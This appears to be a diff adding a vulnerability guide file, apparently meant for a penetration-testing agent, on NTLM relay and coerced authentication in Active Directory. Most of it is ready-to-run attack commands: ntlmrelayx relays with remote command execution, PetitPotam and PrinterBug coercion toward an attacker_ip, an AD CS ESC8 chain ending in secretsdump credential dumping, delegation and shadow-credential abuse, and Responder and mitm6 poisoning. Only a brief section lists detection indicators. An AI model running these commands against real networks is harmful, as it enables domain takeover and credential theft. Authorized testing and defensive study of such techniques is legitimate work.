@@ -1,0 +1,201 @@
+<vulnerability_guide>
+  <title>NTLM RELAY ATTACKS AND COERCED AUTHENTICATION</title>
+
+  <critical>NTLM relay attacks intercept authentication attempts and relay them to another service, gaining unauthorized access without cracking the password. Combined with authentication coercion techniques (PetitPotam, PrinterBug, DFSCoerce), attackers can force high-privilege accounts to authenticate to attacker-controlled systems. This is one of the most powerful attack vectors in Active Directory.</critical>
+
+  <scope>
+    - SMB to SMB relay (when signing not required)
+    - SMB to LDAP/LDAPS relay for AD modifications
+    - SMB to HTTP relay (AD CS, Exchange, ADFS)
+    - HTTP to SMB/LDAP relay
+    - Cross-protocol relay attacks
+    - Machine account authentication coercion
+  </scope>
+
+  <methodology>
+    1. **Identify relay targets**: Find services without message signing
+    2. **Set up relay server**: Configure ntlmrelayx or similar tool
+    3. **Coerce authentication**: Trigger authentication from victim to attacker
+    4. **Relay authentication**: Forward credentials to target service
+    5. **Execute payload**: Leverage relayed session for access/modification
+  </methodology>
+
+  <advanced_techniques>
+    <identify_relay_targets>
+      Find vulnerable services:
+      {% raw %}
+      # Check SMB signing status
+      crackmapexec smb targets.txt --gen-relay-list relay_targets.txt
+      nmap -p445 --script smb2-security-mode 192.168.1.0/24
+
+      # Check LDAP signing status
+      crackmapexec ldap dc.domain.local -u user -p pass -M ldap-checker
+
+      # Check AD CS HTTP endpoints
+      crackmapexec smb dc.domain.local -u user -p pass -M adcs
+
+      # Find DCs without LDAP signing enforced
+      ldapsearch -x -H ldap://dc.domain.local -b "CN=Configuration,DC=domain,DC=local" "(objectClass=crossRef)"
+      {% endraw %}
+    </identify_relay_targets>
+
+    <ntlm_relay_setup>
+      Configure relay server:
+      {% raw %}
+      # Basic SMB relay
+      ntlmrelayx.py -t smb://target -smb2support
+
+      # Relay to multiple targets
+      ntlmrelayx.py -tf targets.txt -smb2support
+
+      # Relay to LDAP for user creation
+      ntlmrelayx.py -t ldaps://dc.domain.local --add-computer
+
+      # Relay to LDAP for delegation abuse
+      ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
+
+      # Relay to AD CS for certificate request
+      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+      # Relay to Exchange for privesc
+      ntlmrelayx.py -t https://exchange.domain.local/EWS/Exchange.asmx
+
+      # Execute command on relay
+      ntlmrelayx.py -t smb://target -c "whoami > C:\\pwned.txt"
+      {% endraw %}
+    </ntlm_relay_setup>
+
+    <authentication_coercion>
+      Force victim to authenticate:
+      {% raw %}
+      # PetitPotam - EFS RPC coercion (unauthenticated on unpatched)
+      PetitPotam.py attacker_ip target_dc
+      PetitPotam.py -u user -p pass -d domain attacker_ip target_dc
+
+      # PrinterBug - Print Spooler RPC
+      SpoolSample.exe target_dc attacker_ip
+      printerbug.py domain/user:pass@target_dc attacker_ip
+
+      # DFSCoerce - DFS RPC
+      dfscoerce.py -u user -p pass -d domain attacker_ip target_dc
+
+      # ShadowCoerce - VSS RPC
+      shadowcoerce.py -u user -p pass -d domain attacker_ip target_dc
+
+      # WebDAV coercion
+      # Create file \\attacker@80\share\file.txt and trick user into accessing
+
+      # Coerce machine account via scheduled task
+      schtasks /create /tn "Trigger" /tr "\\\\attacker\\share" /sc once /st 00:00 /s target
+      {% endraw %}
+    </authentication_coercion>
+
+    <relay_to_adcs>
+      AD Certificate Services relay (ESC8):
+      {% raw %}
+      # Identify vulnerable CA
+      certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
+
+      # Set up relay to CA HTTP endpoint
+      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+      # Coerce DC authentication
+      PetitPotam.py attacker_ip dc.domain.local
+
+      # Use obtained certificate
+      certipy auth -pfx dc.pfx
+      # Results in NT hash of DC machine account
+
+      # DCSync with machine account
+      secretsdump.py -hashes :HASH domain/DC\$@dc.domain.local
+      {% endraw %}
+    </relay_to_adcs>
+
+    <relay_to_ldap>
+      LDAP relay for AD modifications:
+      {% raw %}
+      # Add computer account (for RBCD attack)
+      ntlmrelayx.py -t ldaps://dc.domain.local --add-computer EVIL$ --computer-pass Password123
+
+      # Delegate access to attacker computer
+      ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access --escalate-user attacker
+
+      # Modify ACLs (requires appropriate privileges on relayed account)
+      ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user attacker
+
+      # Shadow Credentials attack
+      ntlmrelayx.py -t ldaps://dc.domain.local --shadow-credentials --shadow-target victim$
+      {% endraw %}
+    </relay_to_ldap>
+
+    <webdav_relay>
+      WebDAV-based relay attacks:
+      {% raw %}
+      # Check if WebDAV is enabled
+      crackmapexec smb target -u user -p pass -M webdav
+
+      # Start WebDAV server
+      # Relay through WebDAV (works even with SMB signing)
+      ntlmrelayx.py -t smb://target --no-http-server -smb2support
+
+      # Coerce via WebDAV (bypasses SMB signing requirement)
+      # Create shortcut or URL file pointing to \\attacker@80\share
+      {% endraw %}
+    </webdav_relay>
+
+    <mitm_positioning>
+      Position for MITM attacks:
+      {% raw %}
+      # Responder - capture and relay
+      responder -I eth0 -wrf
+
+      # LLMNR/NBT-NS poisoning
+      responder -I eth0 -Pv
+
+      # ARP spoofing for positioning
+      arpspoof -i eth0 -t target gateway
+
+      # IPv6 DNS takeover
+      mitm6 -d domain.local
+      ntlmrelayx.py -6 -t ldaps://dc.domain.local --delegate-access
+      {% endraw %}
+    </mitm_positioning>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully identify systems without SMB/LDAP signing
+    - Coerce authentication from target machine
+    - Relay authentication to vulnerable service
+    - Demonstrate code execution or AD modification
+    - Document impact (computer account creation, delegation, certificates)
+  </validation>
+
+  <false_positives>
+    - SMB signing required - relay will fail
+    - LDAP channel binding enforced
+    - EPA (Extended Protection for Authentication) enabled
+    - Machine account without exploitable privileges
+    - Firewall blocking required ports
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4624 from unexpected source IPs
+    - Authentication to CA web enrollment from DC machine accounts
+    - Computer account creation without corresponding join
+    - msDS-AllowedToActOnBehalfOfOtherIdentity modifications
+    - Certificate enrollment for machine accounts via HTTP
+  </detection_indicators>
+
+  <pro_tips>
+    - Domain Controllers authenticating to CA HTTP = Domain Admin via ESC8
+    - WebDAV relay bypasses SMB signing requirement
+    - mitm6 + ntlmrelayx is powerful in IPv6-enabled networks
+    - Machine accounts often have more privileges than expected
+    - Relay to LDAPS works even when LDAP signing is required (channel binding matters)
+    - Shadow Credentials attack persists even after password change
+    - RBCD (Resource-Based Constrained Delegation) via relay = persistent access
+    - Check for Print Spooler enabled on DCs (often is, shouldn't be)
+  </pro_tips>
+
+  <remember>NTLM relay is powerful because it reuses the authentication without needing the password, and coercion techniques can force high-privilege machine accounts to authenticate to attacker-controlled systems.</remember>
+</vulnerability_guide>
